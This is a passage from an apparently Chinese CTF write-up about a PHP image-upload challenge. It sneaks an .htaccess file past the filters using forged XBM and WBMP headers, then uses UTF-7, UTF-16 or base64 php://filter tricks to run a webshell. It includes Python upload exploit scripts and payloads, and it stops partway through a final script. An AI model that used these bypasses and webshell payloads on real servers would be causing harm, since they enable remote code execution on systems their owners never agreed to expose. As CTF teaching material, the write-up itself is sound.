</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>接着两个判断，第一个判断<code>$parts[0]</code>是否为空，为空就将<code>$parts[0]</code>移除数组，第二个判断<code>$parts</code>长度是否为 0 ，第三个判断<code>$ext</code>是否在黑名单里面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>array_shift</span><span class=p>(</span><span class=nv>$parts</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$parts</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol filename is empty&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$ext</span><span class=p>,</span> <span class=nv>$disallowed_ext</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol nice try, but im not stupid dude...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>本题对于文件名的处理大致就是这么处理，所以直接传<code>.htaccess</code>会在第一个判断时把<code>$parts</code>全都置为空。</p><p>因为文件名分割是以<code>explode(".", $name);</code>分割，所以我们可以用多个点来进行绕过，例如可以用<code>..htaccess</code></p><p>接下来就是绕过后面的判断了，<code>exif_imagetype</code>绕过比较简单，可以直接使用 gif 的头<code>GIF98a</code>绕过就行了，但是后面的长度检测就比较麻烦了，这里 check 了文件内容的大小，而且重要的是<code>.htaccess</code>需要标准的格式，如果前面有非标准冗余的内容，<code>.htaccess</code>会解析失败。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$image_size</span> <span class=o>=</span> <span class=nx>getimagesize</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$image_size</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!==</span> <span class=mi>1337</span> <span class=o>||</span> <span class=nv>$image_size</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>!==</span> <span class=mi>1337</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol noob, your pic is not l33t enough&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>所以我们需要找到一个比较特殊的图片格式</p><p>Permalink before if: https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67<img src=https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67 loading=lazy></p><p>查看 <a class=link href=https://en.wikipedia.org/wiki/X_BitMap target=_blank rel=noopener>wiki</a> 我们可以知道</p><blockquote><p>​ XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, &lsquo;0x13&rsquo; for example, so that multiple ASCII characters are used to express a single byte of image information</p></blockquote><p>并且在 wiki 中我们也可以得到一个 sample :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#define test_width 16
</span></span></span><span class=line><span class=cl><span class=cp>#define test_height 7
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>static</span> <span class=kt>char</span> <span class=n>test_bits</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0xcd</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0xa5</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0xc5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x60</span> <span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>XBM 文件竟然可以用<code>#define</code>来规定图片的 width & height，而<code>#</code>在<code>.htaccess</code>文件中恰好是注释符，也不会引起解析错误，所以我们可以往这个方向去试一试。</p><p>Permalink before if: https://blogpic.zdy.one/img/20190827155221.png<img src=https://blogpic.zdy.one/img/20190827155221.png loading=lazy></p><p>将 width & height 改成需要的数值，这样我们就可以上传<code>.htaccess</code>了</p><h3 id=webshell>webshell</h3><p>既然可以上传了<code>.htaccess</code>，那接下来就是到传 webshell 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$image</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$image</span><span class=p>,</span> <span class=s2>&#34;&lt;?&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>(</span><span class=s2>&#34;why would you need php in a pic.....&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>主要就是对<code>&lt;?</code>的绕过了，这里我们可以使用<code>htaccess</code>的另外一些技巧来进行绕过，我们可以在 <a class=link href=https://www.php.net/manual/en/configuration.changes.php target=_blank rel=noopener>How to change configuration settings</a> 这里查找到 php 关于<code>.htaccess</code>的处理文档。</p><p>并且我们可以看到有一个比较有意思的选项：</p><blockquote><p>​ zend.multibyte boolean</p><p>Enables parsing of source files in multibyte encodings. Enabling zend.multibyte is required to use character encodings like SJIS, BIG5, etc that contain special characters in multibyte string data. ISO-8859-1 compatible encodings like UTF-8, EUC, etc do not require this option.</p><p>Enabling zend.multibyte requires the mbstring extension to be available.</p></blockquote><p>以及</p><blockquote><p>​ zend.script_encoding string</p><p>This value will be used unless a <a class=link href=https://www.php.net/manual/en/control-structures.declare.php#control-structures.declare.encoding target=_blank rel=noopener>declare(encoding=&mldr;)</a> directive appears at the top of the script. When ISO-8859-1 incompatible encoding is used, both zend.multibyte and zend.script_encoding must be used.</p><p>Literal strings will be transliterated from zend.script_enconding to mbstring.internal_encoding, as if<a class=link href=https://www.php.net/manual/en/function.mb-convert-encoding.php target=_blank rel=noopener>mb_convert_encoding()</a> would have been called.</p></blockquote><p>并且我们在 <a class=link href=https://www.php.net/manual/en/mbstring.supported-encodings.php target=_blank rel=noopener>Supported Character Encodings</a> 可以找到 php 支持的编码方式，根据这两个选项我们就可以利用编码的形式来编码我们的文件内容，然后利用<code>.htaccess</code>的设置来进行解码执行。</p><p>所以这里我们可以使用 UTF-7 编码来进行编码内容，并且使用<code>auto_append_file</code>把<code>.htaccess</code>的内容在执行时追加入到当前目录的文件中，例如在<code>.htaccess</code>中我们可以这么这么写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#define test_width 1337
</span></span><span class=line><span class=cl>#define test_height 1337
</span></span><span class=line><span class=cl>AddType application/x-httpd-php .xbm
</span></span><span class=line><span class=cl>php_flag zend.multibyte 1
</span></span><span class=line><span class=cl>php_value zend.script_encoding &#34;UTF-7&#34;
</span></span><span class=line><span class=cl>php_value auto_append_file .htaccess
</span></span><span class=line><span class=cl>#+ADw?php phpinfo()+ADs
</span></span></code></pre></td></tr></table></div></div><p>然后再上传一个宽度高度符合要求的 xbm 文件即可。</p><p>Permalink before if: https://blogpic.zdy.one/img/20190828023441.png<img src=https://blogpic.zdy.one/img/20190828023441.png loading=lazy></p><p>当然也可以使用其他编码啦，比如 utf-16，一种大端编码的方式，一个字符由两个字节编码，我们可以这么构造：</p><p>Permalink before if: https://blogpic.zdy.one/img/20190830022019.png<img src=https://blogpic.zdy.one/img/20190830022019.png loading=lazy></p><p>exp.php 中的内容就是你想上传的 php 代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>VALID_XBM</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;#define width 1337
</span></span></span><span class=line><span class=cl><span class=s2>#define height 1337&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://your_url/upload/?&#34;</span>
</span></span><span class=line><span class=cl><span class=n>RANDOM_DIRECTORY</span> <span class=o>=</span> <span class=s2>&#34;674b2fcf215d9e16619a0ad3648e704ee50377e5&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>COOKIES</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHPSESSID&#34;</span> <span class=p>:</span> <span class=s2>&#34;fsppftvh6q5kpf8e0b7e9p2le5&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=s1>&#39;image/png&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;upload&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;Submit Query&#34;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>COOKIES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HT_ACCESS</span> <span class=o>=</span> <span class=n>VALID_XBM</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>AddType application/x-httpd-php .zedd
</span></span></span><span class=line><span class=cl><span class=s2>php_value zend.multibyte 1
</span></span></span><span class=line><span class=cl><span class=s2>php_value zend.detect_unicode 1
</span></span></span><span class=line><span class=cl><span class=s2>php_value display_errors 1
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_FILE</span> <span class=o>=</span> <span class=n>VALID_XBM</span> <span class=o>+</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exp.php&#34;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-16&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;..htaccess&#34;</span><span class=p>,</span> <span class=n>HT_ACCESS</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;source.zedd&#34;</span><span class=p>,</span> <span class=n>TARGET_FILE</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wbmp>WBMP</h2><h3 id=htaccess-1>.htaccess</h3><p>除了 XBM 文件，当然还有其他文件可以利用啦。例如 wbmp 格式的图片文件。</p><p>因为在<code>.htaccess</code> 中<code>0x00</code>开头的一行会与<code>#</code>一样被当作注释处理，然后我们也可以发现标准的 xbm 格式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$	xxd test3.wbmp <span class=p>|</span> head
</span></span><span class=line><span class=cl>00000000: <span class=m>0000</span> <span class=m>8930</span> <span class=m>8620</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span>  ...0. ..........
</span></span><span class=line><span class=cl>00000010: <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0012</span> <span class=m>4908</span> <span class=m>0002</span> <span class=m>0081</span>  ..........I.....
</span></span><span class=line><span class=cl>00000020: <span class=m>0440</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>2400</span> <span class=m>0009</span>  .@..........$...
</span></span><span class=line><span class=cl>00000030: <span class=m>2092</span> <span class=m>4800</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>0000</span> <span class=m>1248</span> <span class=m>4012</span>   .H..........H@.
</span></span><span class=line><span class=cl>00000040: <span class=m>4000</span> <span class=m>0040</span> <span class=m>2224</span> 954a a4aa <span class=m>9224</span> <span class=m>8900</span> <span class=m>8410</span>  @..@<span class=s2>&#34;</span>$<span class=s2>.J...</span>$<span class=s2>....
</span></span></span><span class=line><span class=cl><span class=s2>00000050: 0012 52a8 8889 2494 94a5 5540 0000 1000  ..R...</span>$<span class=s2>...U@....
</span></span></span><span class=line><span class=cl><span class=s2>00000060: 0000 5480 0200 0928 0000 0000 0000 002a  ..T....(.......*
</span></span></span><span class=line><span class=cl><span class=s2>00000070: 9248 0001 2555 2490 0000 0000 0000 0000  .H..%U</span>$<span class=s2>.........
</span></span></span><span class=line><span class=cl><span class=s2>00000080: 0000 0000 0000 0000 1124 a555 5555 5555  .........</span>$<span class=s2>.UUUUU
</span></span></span><span class=line><span class=cl><span class=s2>00000090: 52aa 4a55 5555 5555 4aaa a8aa 0000 0000  R.JUUUUUJ.......
</span></span></span></code></pre></td></tr></table></div></div><p>可以发现这个的开头其实就是<code>0x00</code>，所以接下来我们只需要更改图片的 width & height 就可以了，但是貌似并没有一个标准的文件格式供我们参考，于是我们可以单独一位一位地去尝试，这样我们就可以得到一个最小的基本没有冗余数据的 wbmp 文件了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$contents</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;test3.wbmp&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$truncated</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$contents</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;truncated.wbmp&#34;</span><span class=p>,</span> <span class=nv>$truncated</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>exif_imagetype</span><span class=p>(</span><span class=s2>&#34;truncated.wbmp&#34;</span><span class=p>))</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$i</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;Shortest file size : </span><span class=si>$i\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>exif_imagetype</span><span class=p>(</span><span class=s2>&#34;truncated.wbmp&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>getimagesize</span><span class=p>(</span><span class=s2>&#34;truncated.wbmp&#34;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>然后我们可以根据 <a class=link href=https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format target=_blank rel=noopener>Wireless Application Protocol Bitmap Format</a> ，可以看出大致的文件构造：</p><div class=table-wrapper><table><thead><tr><th style=text-align:center>Field name</th><th style=text-align:center>Field type</th><th style=text-align:center>Size (in bytes)</th><th style=text-align:center>Purpose</th></tr></thead><tbody><tr><td style=text-align:center>Type</td><td style=text-align:center><a class=link href=https://en.wikipedia.org/wiki/Variable_length_unsigned_integer target=_blank rel=noopener>uintvar</a></td><td style=text-align:center>variable</td><td style=text-align:center>Type of the image, and is 0 for monochrome bitmaps.</td></tr><tr><td style=text-align:center>Fixed header</td><td style=text-align:center><a class=link href=https://en.wikipedia.org/wiki/Byte target=_blank rel=noopener>byte</a></td><td style=text-align:center>1</td><td style=text-align:center>Reserved. Always 0.</td></tr><tr><td style=text-align:center>Width</td><td style=text-align:center><a class=link href=https://en.wikipedia.org/wiki/Variable_length_unsigned_integer target=_blank rel=noopener>uintvar</a></td><td style=text-align:center>variable</td><td style=text-align:center>Width of the image in pixels.</td></tr><tr><td style=text-align:center>Height</td><td style=text-align:center><a class=link href=https://en.wikipedia.org/wiki/Variable_length_unsigned_integer target=_blank rel=noopener>uintvar</a></td><td style=text-align:center>variable</td><td style=text-align:center>Height of the image in pixels.</td></tr><tr><td style=text-align:center>Data</td><td style=text-align:center>byte array</td><td style=text-align:center>variable</td><td style=text-align:center>Data bytes arranged in rows – one bit per pixel. A black pixel is denoted by 0 and a white pixel is denoted by 1. Where the row length is not divisible by 8, the row is 0-padded to the byte boundary.</td></tr></tbody></table></div><p>还有这个 wbmp 的宽度高度格式有点奇怪，第三位是以 128 为基数算的，所以这里只能凑一下得到 1337 的高与宽</p><p>Permalink before if: https://blogpic.zdy.one/img/20190828165647.png<img src=https://blogpic.zdy.one/img/20190828165647.png loading=lazy></p><p>这里需要注意一下有个坑，直接提交的话还不知什么原因会自动加上<code>0xefbf</code>污染了原数据，所以这里需要手动写脚本交一下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>VALID_WBMP</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00\x8a\x39\x8a\x39\x0a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://your_url/upload/?&#34;</span>
</span></span><span class=line><span class=cl><span class=n>RANDOM_DIRECTORY</span> <span class=o>=</span> <span class=s2>&#34;674b2fcf215d9e16619a0ad3648e704ee50377e5&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>COOKIES</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHPSESSID&#34;</span> <span class=p>:</span> <span class=s2>&#34;kivnml45mpi9ohknv2i8s8ecoj&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=s1>&#39;image/png&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;upload&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;Submit Query&#34;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>COOKIES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HT_ACCESS</span> <span class=o>=</span> <span class=n>VALID_WBMP</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>AddType application/x-httpd-php .zedd
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;..htaccess&#34;</span><span class=p>,</span> <span class=n>HT_ACCESS</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=webshell-1>webshell</h3><p>既然能传<code>.htaccess</code>了，当然我们也可以用上面提到的 UTF-7 编码绕过，但是这里我们可以换另一种形式，比如 base64。</p><blockquote><p>​ auto_append_file string</p><p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the <a class=link href=https://www.php.net/manual/en/function.require.php target=_blank rel=noopener>require</a> function, so <a class=link href=https://www.php.net/manual/en/ini.core.php#ini.include-path target=_blank rel=noopener>include_path</a> is used.</p><p>The special value <em>none</em> disables auto-appending.</p></blockquote><p>让我们仔细看看这个定义，这个功能就相当于使用了<code>require</code>方法，所以我们当然也可以使用<code>php://filter</code>啦，比如我们最常用的文件包含<code>php://filter/read=convert.base64-decode/resource=</code></p><p>所以我们可以先传一个用 WBMP 格式头伪装的文件，文件中有经过 base64 编码过后的 php 代码，然后经过<code>.htaccess</code>的作用，我们就可以执行任意 php 代码了，但是这里需要注意的是，base64 编码解码的时候，会把整个文件内容当作字符串解码，意思就是说，WBMP 格式头当然也会被解码，这里需要让文件头凑够足够的位数，比如在<code>\x00\x00\x8a\x39\x8a\x39\x0a</code>中，这里一共有 56 bit，base64 在解码的时候，24 bit 为一组，再分成三个字节进行解码，56 bit 不足 72(24*3 ) bit ，需要去我们添加的数据进行补齐，所以就会造成“污染”了我们构造的编码数据。所以这里我们只需要再增加到 72 bit 即可，也就是 2(16bit) 字节，让文件头与这 2 字节被一起解码即可，解码结果不影响 php 解析即可。</p><p>所以完整脚本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
